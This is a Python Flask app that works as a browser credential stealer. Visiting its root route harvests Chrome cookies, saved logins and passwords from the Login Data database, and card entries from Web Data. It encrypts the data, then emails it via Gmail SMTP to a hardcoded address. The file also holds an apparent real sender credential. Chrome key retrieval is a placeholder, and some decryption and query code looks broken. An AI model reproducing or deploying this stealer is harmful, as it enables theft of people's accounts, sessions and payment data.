from flask import Flask
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import base64
import sqlite3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import browser_cookie3
import subprocess
import time

# Global encryption key
key = os.urandom(32)  # Use a securely stored key in production

# Function to encrypt data
def encrypt_data(data):
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')

# Function to decrypt data
def decrypt_data(encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
    iv = encrypted_data[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data[AES.block_size:]), AES.block_size)
    return decrypted_data.decode('utf-8')

# Function to scrape Chrome data (cookies, passwords, and credit cards)
def scrape_chrome_data():
    cookies = []
    passwords_data = ""
    credit_card_data = ""

    # Scrape cookies data
    try:
        cj = browser_cookie3.chrome(cookie_file=None)  # Bypass DBUS issue
        for cookie in cj:
            cookies.append(f"Name: {cookie.name}, Value: {cookie.value}")
        cookies_data = "\n".join(cookies)  # Join cookies into a string
    except Exception as e:
        cookies_data = f"Error fetching cookies: {str(e)}"
        print(f"Error fetching cookies: {str(e)}")

    # Scrape passwords from Chrome (requires Login Data file access)
    try:
        password_db = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        print(f"Attempting to access password database at {password_db}")
        connection = sqlite3.connect(password_db)
        cursor = connection.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            decrypted_password = decrypt_password(row[2])  # Decrypt password
            passwords.append(f"URL: {row[0]}, Username: {row[1]}, Password: {decrypted_password}")
        passwords_data = "\n".join(passwords)  # Join passwords into a string
    except Exception as e:
        passwords_data = f"Error fetching passwords: {str(e)}"
        print(f"Error fetching passwords: {str(e)}")

    # Scrape credit card data from Chrome
    try:
        credit_card_db = os.path.expanduser("~/.config/google-chrome/Default/Web Data")
        print(f"Attempting to access credit card database at {credit_card_db}")
        connection = sqlite3.connect(credit_card_db)
        cursor = connection.cursor()
        cursor.execute("SELECT name, value FROM credit_cards")
        credit_cards = []
        for row in cursor.fetchall():
            credit_cards.append(f"Card Name: {row[0]}, Card Value: {row[1]}")
        credit_card_data = "\n".join(credit_cards)  # Join card data into a string
    except Exception as e:
        credit_card_data = f"Error fetching credit card data: {str(e)}"
        print(f"Error fetching credit card data: {str(e)}")
    
    # Combine all data (cookies, passwords, credit cards)
    data = f"Cookies:\n{cookies_data}\nPasswords:\n{passwords_data}\nCredit Cards:\n{credit_card_data}"
    encrypted_data = encrypt_data(data)
    
    with open("chrome_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to decrypt Chrome's encrypted passwords
def decrypt_password(encrypted_password):
    try:
        # Simulated key retrieval for demonstration purposes
        key = get_chrome_key()  # Retrieve the encryption key (implement for your OS)
        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password[:12])
        decrypted_password = cipher.decrypt_and_verify(encrypted_password[12:], encrypted_password[-16:])
        return decrypted_password.decode('utf-8')
    except Exception as e:
        return f"Error decrypting password: {str(e)}"

# Helper function to get Chrome's encryption key
def get_chrome_key():
    # This function should retrieve Chrome's decryption key based on the OS
    return b"your_chrome_encryption_key_here"  # This is a placeholder

# Function to send email with the scraped data
def send_email(file_path, recipient_email, data):
    sender_email = "cardonewhite081@gmail.com"
    password = "mmcwhorkhfccdgwq"  # Use app-specific passwords or OAuth for better security
    
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = "Scraped Data"
    message.attach(MIMEText(data, "plain"))

    # Send the email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, message.as_string())

# Main function to scrape data and send email
def main():
    # Scrape Chrome data (cookies, passwords, credit cards)
    scrape_chrome_data()

    # Send email with the decrypted content of the scraped data
    try:
        with open("chrome_scraped_data.txt", "r") as file:
            encrypted_data = file.read()
        decrypted_data = decrypt_data(encrypted_data)
        send_email("chrome_scraped_data.txt", "cardonewhite081@gmail.com", decrypted_data)
    except Exception as e:
        print(f"Error sending email: {str(e)}")

# Flask route to run the script
app = Flask(__name__)

@app.route('/')
def run_script():
    try:
        main()
        return "Script executed successfully"
    except Exception as e:
        print(f"Error in script execution: {str(e)}")
        return f"Error: {str(e)}"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
